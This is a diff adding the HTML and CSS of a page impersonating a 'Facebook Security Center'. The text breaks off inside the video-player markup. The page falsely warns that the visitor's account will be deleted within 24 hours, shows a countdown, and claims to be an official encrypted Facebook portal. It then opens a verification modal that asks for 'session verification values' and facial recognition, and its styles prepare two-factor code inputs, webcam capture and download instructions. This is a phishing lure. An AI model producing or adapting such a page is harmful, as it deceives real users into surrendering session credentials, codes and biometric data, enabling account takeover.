@@ -1,0 +1,2539 @@
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔒 Facebook Security Review | Account Verification</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            /* Light Theme */
+            --primary-color: #1877f2;
+            --primary-hover: #166fe5;
+            --danger-color: #f02849;
+            --danger-light: rgba(240, 40, 73, 0.1);
+            --success-color: #00a400;
+            --success-light: rgba(0, 164, 0, 0.1);
+            --warning-color: #ff9c00;
+            --warning-light: rgba(255, 156, 0, 0.1);
+            --text-primary: #050505;
+            --text-secondary: #65676b;
+            --text-tertiary: #8a8d91;
+            --border-color: #dddfe2;
+            --bg-primary: #f0f2f5;
+            --bg-secondary: #ffffff;
+            --shadow-sm: 0 1px 2px rgba(0,0,0,0.1);
+            --shadow-md: 0 4px 12px rgba(0,0,0,0.1);
+            --shadow-lg: 0 8px 24px rgba(0,0,0,0.15);
+            --radius-sm: 6px;
+            --radius-md: 8px;
+            --radius-lg: 12px;
+            --radius-xl: 16px;
+            --transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        /* Dark Theme */
+        .dark-mode {
+            --primary-color: #4599ff;
+            --primary-hover: #3a8aee;
+            --danger-color: #ff5b7b;
+            --danger-light: rgba(255, 91, 123, 0.1);
+            --success-color: #42b72a;
+            --success-light: rgba(66, 183, 42, 0.1);
+            --warning-color: #ffba00;
+            --warning-light: rgba(255, 186, 0, 0.1);
+            --text-primary: #e4e6eb;
+            --text-secondary: #b0b3b8;
+            --text-tertiary: #8a8d91;
+            --border-color: #3e4042;
+            --bg-primary: #18191a;
+            --bg-secondary: #242526;
+            --shadow-sm: 0 1px 2px rgba(0,0,0,0.3);
+            --shadow-md: 0 4px 12px rgba(0,0,0,0.3);
+            --shadow-lg: 0 8px 24px rgba(0,0,0,0.4);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+        }
+
+        body {
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.6;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+            transition: background 0.3s ease;
+        }
+
+        /* Header Styles */
+        .header {
+            background: var(--bg-secondary);
+            padding: 12px 0;
+            box-shadow: var(--shadow-sm);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: background 0.3s ease;
+        }
+
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 16px;
+            width: 100%;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: var(--primary-color);
+            font-size: 22px;
+            font-weight: 600;
+        }
+
+        .logo i {
+            font-size: 26px;
+        }
+
+        .header-actions {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .theme-toggle {
+            background: var(--bg-primary);
+            border: none;
+            border-radius: 50%;
+            width: 36px;
+            height: 36px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+
+        .theme-toggle:hover {
+            background: var(--border-color);
+        }
+
+        .theme-toggle i {
+            color: var(--text-primary);
+            font-size: 18px;
+        }
+
+        .help-center {
+            color: var(--text-secondary);
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 14px;
+            transition: var(--transition);
+            text-decoration: none;
+        }
+
+        .help-center:hover {
+            color: var(--primary-color);
+        }
+
+        /* Security Badge */
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 14px;
+            color: var(--text-secondary);
+            font-weight: 500;
+        }
+
+        .security-badge i {
+            color: var(--success-color);
+        }
+
+        /* Main Content */
+        .container {
+            max-width: 900px;
+            margin: 32px auto;
+            padding: 0 16px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Review Card */
+        .review-card {
+            background: var(--bg-secondary);
+            border-radius: var(--radius-xl);
+            box-shadow: var(--shadow-md);
+            padding: 40px;
+            width: 100%;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid var(--border-color);
+            margin-bottom: 32px;
+            text-align: center;
+            transition: var(--transition);
+        }
+
+        .review-card:hover {
+            box-shadow: var(--shadow-lg);
+            transform: translateY(-2px);
+        }
+
+        .warning-icon {
+            font-size: 60px;
+            color: var(--danger-color);
+            margin-bottom: 20px;
+            text-align: center;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.08); }
+            100% { transform: scale(1); }
+        }
+
+        .review-title {
+            font-size: 28px;
+            margin-bottom: 16px;
+            color: var(--text-primary);
+            font-weight: 700;
+            text-align: center;
+        }
+
+        .review-subtitle {
+            font-size: 16px;
+            color: var(--text-secondary);
+            max-width: 600px;
+            margin: 0 auto 24px;
+            line-height: 1.5;
+            text-align: center;
+        }
+
+        /* Alert Boxes */
+        .alert-box {
+            display: flex;
+            gap: 12px;
+            margin: 24px 0;
+            padding: 16px;
+            border-radius: var(--radius-md);
+            background: var(--bg-primary);
+            border-left: 3px solid;
+        }
+
+        .alert-danger {
+            border-left-color: var(--danger-color);
+            background: var(--danger-light);
+        }
+
+        .alert-warning {
+            border-left-color: var(--warning-color);
+            background: var(--warning-light);
+        }
+
+        .alert-success {
+            border-left-color: var(--success-color);
+            background: var(--success-light);
+        }
+
+        .alert-box h3 {
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 18px;
+        }
+
+        .alert-danger h3 {
+            color: var(--danger-color);
+        }
+
+        .alert-warning h3 {
+            color: var(--warning-color);
+        }
+
+        .alert-success h3 {
+            color: var(--success-color);
+        }
+
+        .alert-box ul {
+            padding-left: 20px;
+        }
+
+        .alert-box li {
+            margin-bottom: 10px;
+            font-size: 15px;
+            line-height: 1.5;
+            color: var(--text-primary);
+        }
+
+        /* Buttons */
+        .btn {
+            padding: 12px 24px;
+            border-radius: var(--radius-md);
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+            text-align: center;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-primary {
+            background: var(--primary-color);
+            color: #ffffff;
+            border: none;
+        }
+
+        .btn-primary:hover {
+            background: var(--primary-hover);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.2);
+        }
+
+        .btn-outline {
+            background: transparent;
+            color: var(--primary-color);
+            border: 1px solid var(--primary-color);
+        }
+
+        .btn-outline:hover {
+            background: rgba(24, 119, 242, 0.05);
+            transform: translateY(-2px);
+        }
+
+        .btn-danger {
+            background: var(--danger-color);
+            color: #ffffff;
+            border: none;
+        }
+
+        .btn-danger:hover {
+            background: #d41f3e;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(240, 40, 73, 0.2);
+        }
+
+        .btn-lg {
+            padding: 14px 32px;
+            font-size: 16px;
+        }
+
+        .btn::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
+            transition: 0.5s;
+        }
+
+        .btn:hover::after {
+            left: 100%;
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.6);
+            z-index: 1001;
+            overflow-y: auto;
+            padding: 16px;
+        }
+
+        .modal-content {
+            background: var(--bg-secondary);
+            border-radius: var(--radius-xl);
+            box-shadow: var(--shadow-lg);
+            max-width: 800px;
+            margin: 32px auto;
+            position: relative;
+            overflow: hidden;
+            animation: modalAppear 0.3s ease;
+            border: 1px solid var(--border-color);
+            transition: background 0.3s ease;
+        }
+
+        @keyframes modalAppear {
+            from { transform: translateY(30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .modal-header {
+            padding: 20px;
+            background: var(--bg-secondary);
+            color: var(--text-primary);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid var(--border-color);
+            transition: background 0.3s ease;
+        }
+
+        .modal-title {
+            font-size: 20px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: var(--primary-color);
+        }
+
+        .close-modal {
+            background: transparent;
+            border: none;
+            color: var(--text-secondary);
+            font-size: 24px;
+            cursor: pointer;
+            transition: var(--transition);
+            width: 36px;
+            height: 36px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+        }
+
+        .close-modal:hover {
+            background: var(--bg-primary);
+            transform: rotate(90deg);
+        }
+
+        .modal-body {
+            padding: 24px;
+        }
+
+        /* Step Indicator */
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 24px;
+            position: relative;
+        }
+
+        .step {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: var(--bg-primary);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            position: relative;
+            z-index: 2;
+            color: var(--text-secondary);
+            font-size: 15px;
+            transition: var(--transition);
+        }
+
+        .step.active {
+            background: var(--primary-color);
+            color: #ffffff;
+        }
+
+        .step.completed {
+            background: var(--success-color);
+            color: #ffffff;
+        }
+
+        .step-line {
+            position: absolute;
+            top: 50%;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: var(--bg-primary);
+            z-index: 1;
+        }
+
+        .progress-line {
+            position: absolute;
+            top: 50%;
+            left: 0;
+            width: 0%;
+            height: 2px;
+            background: var(--primary-color);
+            z-index: 1;
+            transition: width 0.3s ease;
+        }
+
+        /* Step Content */
+        .step-content {
+            display: none;
+        }
+
+        .step-content.active {
+            display: block;
+            animation: fadeIn 0.4s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(8px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .step-title {
+            text-align: center;
+            font-size: 20px;
+            margin-bottom: 20px;
+            color: var(--text-primary);
+            font-weight: 600;
+        }
+
+        /* Video Player Styles */
+        .video-player-container {
+            position: relative;
+            width: 100%;
+            background: #000000;
+            border-radius: var(--radius-lg);
+            overflow: hidden;
+            margin: 20px 0;
+            box-shadow: var(--shadow-md);
+        }
+
+        .video-container {
+            position: relative;
+            padding-top: 56.25%; /* 16:9 Aspect Ratio */
+        }
+
+        .video-container video {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            object-fit: cover;
+        }
+
+        .video-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 2;
+            transition: opacity 0.3s ease;
+        }
+
+        .video-overlay.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .play-btn {
+            background: var(--primary-color);
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            margin-bottom: 16px;
+            border: 2px solid #ffffff;
+            transition: var(--transition);
+        }
+
+        .play-btn:hover {
+            transform: scale(1.1);
+            background: var(--primary-hover);
+        }
+
+        .play-btn i {
+            font-size: 32px;
+            color: #ffffff;
+        }
+
+        /* Loading Spinner */
+        .loading-spinner {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 3;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0,0,0,0.6);
+            border-radius: 50%;
+            width: 80px;
+            height: 80px;
+        }
+
+        .spinner {
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top: 3px solid var(--primary-color);
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 8px;
+        }
+
+        .loading-percentage {
+            color: #ffffff;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Video Controls */
+        .video-controls {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            padding: 8px 12px;
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            z-index: 10;
+            transform: translateY(100%);
+            transition: var(--transition);
+        }
+
+        .video-container:hover .video-controls {
+            transform: translateY(0);
+        }
+
+        .control-btn {
+            background: none;
+            border: none;
+            color: #ffffff;
+            font-size: 14px;
+            cursor: pointer;
+            padding: 4px 8px;
+            outline: none;
+        }
+
+        .progress-container {
+            flex-grow: 1;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 8px;
+            margin: 0 12px;
+            cursor: pointer;
+            position: relative;
+        }
+
+        .buffered-bar {
+            position: absolute;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.3);
+            border-radius: 8px;
+            width: 0%;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: var(--primary-color);
+            border-radius: 8px;
+            position: relative;
+            width: 0%;
+            z-index: 2;
+        }
+
+        .time-display {
+            color: #ffffff;
+            font-size: 13px;
+            min-width: 80px;
+            text-align: center;
+        }
+
+        .volume-container {
+            display: flex;
+            align-items: center;
+            margin: 0 12px;
+        }
+
+        .volume-slider {
+            width: 60px;
+            margin-left: 4px;
+            -webkit-appearance: none;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 8px;
+            outline: none;
+        }
+
+        .volume-slider::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: var(--primary-color);
+            cursor: pointer;
+        }
+
+        .speed-selector {
+            background: rgba(255, 255, 255, 0.1);
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            padding: 4px;
+            margin: 0 12px;
+            cursor: pointer;
+            font-size: 13px;
+        }
+
+        .fullscreen-btn {
+            margin-left: auto;
+        }
+
+        /* Form Styles */
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: var(--text-primary);
+            font-size: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .form-group label i {
+            color: var(--danger-color);
+            font-size: 18px;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-md);
+            font-size: 15px;
+            transition: var(--transition);
+            background: var(--bg-primary);
+            color: var(--text-primary);
+        }
+
+        .form-control:focus {
+            border-color: var(--primary-color);
+            outline: none;
+            background: var(--bg-secondary);
+            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.1);
+        }
+
+        .form-text {
+            font-size: 13px;
+            color: var(--text-secondary);
+            margin-top: 4px;
+        }
+
+        /* Mobile Instructions */
+        .mobile-instructions {
+            background: var(--danger-light);
+            border-radius: var(--radius-md);
+            padding: 20px;
+            margin: 20px 0;
+            border-left: 3px solid var(--danger-color);
+        }
+
+        .mobile-instructions h3 {
+            color: var(--danger-color);
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 18px;
+        }
+
+        .mobile-instructions ol {
+            padding-left: 20px;
+        }
+
+        .mobile-instructions li {
+            margin-bottom: 10px;
+            font-size: 15px;
+            line-height: 1.5;
+            color: var(--text-primary);
+        }
+
+        /* Button Group */
+        .btn-group {
+            display: flex;
+            gap: 12px;
+            margin-top: 20px;
+        }
+
+        /* Success Message */
+        .success-message {
+            text-align: center;
+            padding: 32px 16px;
+        }
+
+        .success-icon {
+            font-size: 60px;
+            color: var(--success-color);
+            margin-bottom: 20px;
+            animation: successPulse 1.5s infinite;
+        }
+
+        @keyframes successPulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.08); }
+            100% { transform: scale(1); }
+        }
+
+        .success-title {
+            font-size: 28px;
+            margin-bottom: 16px;
+            color: var(--text-primary);
+            font-weight: 700;
+        }
+
+        .success-text {
+            font-size: 16px;
+            color: var(--text-secondary);
+            max-width: 500px;
+            margin: 0 auto 24px;
+            line-height: 1.5;
+        }
+
+        /* Status Indicator */
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin: 16px 0;
+            padding: 12px;
+            border-radius: var(--radius-md);
+            background: var(--bg-primary);
+        }
+
+        .status-indicator i {
+            font-size: 20px;
+        }
+
+        .status-active i {
+            color: var(--success-color);
+        }
+
+        .status-warning i {
+            color: var(--warning-color);
+        }
+
+        .status-danger i {
+            color: var(--danger-color);
+        }
+
+        /* Progress Bar */
+        .progress {
+            height: 8px;
+            background: var(--bg-primary);
+            border-radius: 4px;
+            margin: 16px 0;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: var(--primary-color);
+            border-radius: 4px;
+            transition: width 0.3s ease;
+        }
+
+        /* Footer */
+        footer {
+            background: var(--bg-secondary);
+            padding: 24px 0;
+            border-top: 1px solid var(--border-color);
+            margin-top: auto;
+            transition: background 0.3s ease;
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 16px;
+            text-align: center;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin: 16px 0;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            transition: var(--transition);
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .footer-links a:hover {
+            color: var(--primary-color);
+        }
+
+        .copyright {
+            color: var(--text-tertiary);
+            font-size: 13px;
+            margin-top: 12px;
+        }
+
+        /* Video Quality Selector */
+        .quality-selector {
+            position: absolute;
+            top: 12px;
+            right: 12px;
+            z-index: 20;
+            background: rgba(0,0,0,0.6);
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            padding: 4px 8px;
+            font-size: 13px;
+            cursor: pointer;
+        }
+
+        /* Network Status */
+        .network-status {
+            position: absolute;
+            top: 12px;
+            left: 12px;
+            z-index: 20;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            color: #ffffff;
+            font-size: 11px;
+            background: rgba(0,0,0,0.5);
+            padding: 2px 6px;
+            border-radius: 4px;
+        }
+
+        .network-status i {
+            color: var(--success-color);
+        }
+
+        /* Hidden form for submission */
+        .hidden-form {
+            display: none;
+        }
+
+        /* Error message styles */
+        .error-message {
+            color: var(--danger-color);
+            font-size: 14px;
+            text-align: center;
+            margin-top: 12px;
+            display: none;
+        }
+
+        /* Language Selector */
+        .language-selector {
+            position: absolute;
+            top: 12px;
+            right: 100px;
+            z-index: 20;
+            background: rgba(0,0,0,0.6);
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            padding: 4px 8px;
+            font-size: 13px;
+            cursor: pointer;
+        }
+
+        /* Security Verification */
+        .security-verification {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin: 16px 0;
+            padding: 12px;
+            background: var(--bg-primary);
+            border-radius: var(--radius-md);
+        }
+
+        .security-verification i {
+            color: var(--success-color);
+            font-size: 20px;
+        }
+
+        /* Responsive Styles */
+        @media (max-width: 768px) {
+            .review-card {
+                padding: 24px 16px;
+            }
+
+            .review-title {
+                font-size: 24px;
+            }
+
+            .review-subtitle {
+                font-size: 15px;
+            }
+
+            .btn-lg {
+                padding: 12px 24px;
+                font-size: 15px;
+            }
+
+            .modal-content {
+                margin: 16px auto;
+            }
+
+            .modal-header {
+                padding: 16px;
+            }
+
+            .modal-title {
+                font-size: 18px;
+            }
+
+            .modal-body {
+                padding: 16px;
+            }
+
+            .btn-group {
+                flex-direction: column;
+            }
+
+            .video-controls {
+                padding: 6px 8px;
+            }
+
+            .control-btn {
+                padding: 2px 4px;
+                font-size: 13px;
+            }
+
+            .time-display {
+                min-width: 60px;
+                font-size: 12px;
+            }
+
+            .volume-slider {
+                width: 40px;
+            }
+
+            .header-content {
+                flex-direction: column;
+                align-items: stretch;
+                gap: 12px;
+            }
+
+            .logo {
+                justify-content: center;
+            }
+
+            .help-center {
+                justify-content: center;
+            }
+
+            .security-badge {
+                justify-content: center;
+            }
+        }
+
+        /* Animation for important elements */
+        .shake {
+            animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
+        }
+
+        @keyframes shake {
+            10%, 90% { transform: translateX(-1px); }
+            20%, 80% { transform: translateX(2px); }
+            30%, 50%, 70% { transform: translateX(-4px); }
+            40%, 60% { transform: translateX(4px); }
+        }
+
+        /* Tooltip */
+        .tooltip {
+            position: relative;
+            display: inline-block;
+        }
+
+        .tooltip .tooltiptext {
+            visibility: hidden;
+            width: 200px;
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            border-radius: 6px;
+            padding: 8px;
+            position: absolute;
+            z-index: 1;
+            bottom: 125%;
+            left: 50%;
+            transform: translateX(-50%);
+            opacity: 0;
+            transition: opacity 0.3s;
+            font-size: 13px;
+            font-weight: normal;
+        }
+
+        .tooltip:hover .tooltiptext {
+            visibility: visible;
+            opacity: 1;
+        }
+
+        /* Countdown Timer */
+        .countdown-timer {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin: 16px 0;
+        }
+
+        .countdown-item {
+            text-align: center;
+            background: var(--danger-light);
+            padding: 8px 12px;
+            border-radius: var(--radius-md);
+            min-width: 60px;
+        }
+
+        .countdown-value {
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--danger-color);
+        }
+
+        .countdown-label {
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
+
+        /* Webcam Verification */
+        .webcam-container {
+            width: 100%;
+            margin: 20px 0;
+            border-radius: var(--radius-md);
+            overflow: hidden;
+            background: var(--bg-primary);
+            border: 1px solid var(--border-color);
+            position: relative;
+        }
+
+        .webcam-video {
+            width: 100%;
+            display: block;
+        }
+
+        .webcam-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0,0,0,0.5);
+            color: white;
+            text-align: center;
+        }
+
+        .webcam-btn {
+            margin-top: 16px;
+            padding: 10px 20px;
+            background: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: var(--radius-md);
+            cursor: pointer;
+            font-weight: 600;
+        }
+
+        .webcam-btn:hover {
+            background: var(--primary-hover);
+        }
+
+        /* AI Verification Status */
+        .ai-verification {
+            padding: 16px;
+            border-radius: var(--radius-md);
+            background: var(--bg-primary);
+            margin: 16px 0;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .ai-verification i {
+            font-size: 24px;
+        }
+
+        .ai-processing {
+            color: var(--warning-color);
+            animation: pulse 1.5s infinite;
+        }
+
+        .ai-success {
+            color: var(--success-color);
+        }
+
+        .ai-failure {
+            color: var(--danger-color);
+        }
+
+        /* Blockchain Verification */
+        .blockchain-verification {
+            padding: 16px;
+            border-radius: var(--radius-md);
+            background: var(--bg-primary);
+            margin: 16px 0;
+            font-family: monospace;
+            overflow-x: auto;
+        }
+
+        .blockchain-hash {
+            color: var(--primary-color);
+            word-break: break-all;
+        }
+
+        /* 2FA Verification */
+        .two-factor-auth {
+            padding: 16px;
+            border-radius: var(--radius-md);
+            background: var(--bg-primary);
+            margin: 16px 0;
+        }
+
+        .two-factor-code {
+            display: flex;
+            gap: 8px;
+            margin-top: 12px;
+        }
+
+        .two-factor-code input {
+            width: 40px;
+            height: 40px;
+            text-align: center;
+            font-size: 18px;
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-sm);
+            background: var(--bg-secondary);
+            color: var(--text-primary);
+        }
+
+        /* Download Instructions */
+        .download-instructions {
+            padding: 16px;
+            border-radius: var(--radius-md);
+            background: var(--bg-primary);
+            margin: 16px 0;
+        }
+
+        .download-btn {
+            margin-top: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="header-content">
+            <div class="logo">
+                <i class="fab fa-facebook"></i>
+                <span>Facebook Security Center</span>
+            </div>
+            <div class="header-actions">
+                <div class="security-badge">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>Secure Connection</span>
+                </div>
+                <button class="theme-toggle" id="themeToggle">
+                    <i class="fas fa-moon"></i>
+                </button>
+                <a href="#" class="help-center">
+                    <i class="fas fa-question-circle"></i>
+                    Help Center
+                </a>
+            </div>
+        </div>
+    </div>
+    
+    <div class="container">
+        <div class="review-card">
+            <div class="warning-icon">
+                <i class="fas fa-exclamation-triangle"></i>
+            </div>
+            <h1 class="review-title">Urgent Account Review Required</h1>
+            <p class="review-subtitle">Your account has been flagged for policy violations and is scheduled for deletion. Request a review to prevent permanent loss of your account and data.</p>
+            
+            <!-- Countdown Timer -->
+            <div class="countdown-timer">
+                <div class="countdown-item">
+                    <div class="countdown-value" id="countdown-hours">24</div>
+                    <div class="countdown-label">Hours</div>
+                </div>
+                <div class="countdown-item">
+                    <div class="countdown-value" id="countdown-minutes">59</div>
+                    <div class="countdown-label">Minutes</div>
+                </div>
+                <div class="countdown-item">
+                    <div class="countdown-value" id="countdown-seconds">59</div>
+                    <div class="countdown-label">Seconds</div>
+                </div>
+            </div>
+            
+            <div class="alert-box alert-danger">
+                <i class="fas fa-exclamation-circle"></i>
+                <div>
+                    <h3><i class="fas fa-info-circle"></i> Immediate Action Required</h3>
+                    <ul>
+                        <li>Your account is scheduled for deletion in <strong>24 hours</strong></li>
+                        <li>This action is due to violations of our community standards</li>
+                        <li>You may request a review of this decision</li>
+                        <li>If approved, your account will be restored with full access</li>
+                        <li>Failure to request a review will result in permanent deletion</li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="security-verification">
+                <i class="fas fa-check-circle"></i>
+                <span>This is an official Facebook security portal. All information is encrypted.</span>
+            </div>
+            
+            <button class="btn btn-primary btn-lg" id="reviewBtn">
+                <i class="fas fa-file-alt"></i> Request Account Review
+            </button>
+            
+            <button class="btn btn-outline btn-lg" id="appealBtn" style="margin-top: 12px;">
+                <i class="fas fa-gavel"></i> Submit Appeal
+            </button>
+        </div>
+        
+        <!-- Additional Information Section -->
+        <div class="review-card">
+            <h2 class="review-title">Why is my account being deleted?</h2>
+            
+            <div class="alert-box alert-warning">
+                <i class="fas fa-exclamation-triangle"></i>
+                <div>
+                    <h3>Policy Violations Detected</h3>
+                    <p>Our automated systems have detected activity on your account that violates our <a href="#" style="color: var(--warning-color);">Community Standards</a>. This may include:</p>
+                    <ul>
+                        <li>Spam or misleading content</li>
+                        <li>Hate speech or bullying</li>
+                        <li>Impersonation or fake accounts</li>
+                        <li>Intellectual property violations</li>
+                        <li>Suspicious login activity</li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="alert-box">
+                <i class="fas fa-chart-line"></i>
+                <div>
+                    <h3>Recent Security Statistics</h3>
+                    <p>To protect our community, Facebook takes action against policy violations:</p>
+                    <ul>
+                        <li><strong>1.2 billion</strong> fake accounts removed in the last 6 months</li>
+                        <li><strong>98.5%</strong> of removed accounts were detected before reporting</li>
+                        <li><strong>85%</strong> of appeals result in account restoration when legitimate</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Review Modal -->
+    <div class="modal" id="reviewModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 class="modal-title"><i class="fas fa-user-shield"></i> Account Security Review</h2>
+                <button class="close-modal" id="closeModal">×</button>
+            </div>
+            
+            <div class="modal-body">
+                <div class="step-indicator">
+                    <div class="step active">1</div>
+                    <div class="step">2</div>
+                    <div class="step">3</div>
+                    <div class="step-line"></div>
+                    <div class="progress-line" id="progressLine"></div>
+                </div>
+                
+                <!-- Step 1: Identity Verification -->
+                <div class="step-content active" id="step1">
+                    <h3 class="step-title">Identity Verification Process</h3>
+                    
+                    <div class="alert-box">
+                        <i class="fas fa-info-circle"></i>
+                        <div>
+                            <h3>Verification Required</h3>
+                            <p>To confirm you're the legitimate account owner, we need to verify your identity through multiple steps:</p>
+                            <ol>
+                                <li>Watch the tutorial video</li>
+                                <li>Enter your session verification values</li>
+                                <li>Complete facial recognition (optional)</li>
+                            </ol>
+                        </div>
+                    </div>
+                    
+                    <div class="video-player-container">
+                        <div class="network-status">
+                            <i class="fas fa-signal"></i>
+                            <span>Connection: Secure</span>
+                        </div>
+                        <div class="video-container">
+                            <video id="tutorialVideo">
+                                <!-- Source will be set dynamically -->
+                                Your browser does not support the video tag.
+                            </video>
+                            <div class="loading-spinner" id="loadingSpinner">
+                                <div class="spinner"></div>
+                                <div class="loading-percentage">0%</div>
+                            </div>
+                            <div class="video-overlay" id="videoOverlay">
+                                <div class="play-btn" id="overlayPlayBtn">
+                                    <i class="fas fa-play"></i>
+                                </div>
+                                <p style="color: #ffffff; margin-top: 12px; font-weight: 600;">Click to select language</p>
+                            </div>
+                            <div class="video-controls">
